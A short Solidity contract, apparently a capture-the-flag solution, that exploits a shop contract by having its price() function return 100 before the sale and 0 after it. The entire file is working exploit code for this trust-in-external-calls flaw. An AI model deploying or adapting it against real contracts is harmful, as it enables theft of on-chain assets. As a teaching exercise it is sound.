// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface IShop {
    function buy() external;
    function isSold() external returns (bool);
}

contract ShopHack {
    address shop;
    uint256 price_;

    constructor(address _shop) {
        shop = _shop;
    }

    function attack() public {
        price_ = 100;
        IShop(shop).buy();
    }

    function price() public returns (uint256) {
        if (IShop(shop).isSold()) {
            return 0;
        }
        return 100;
    }
}
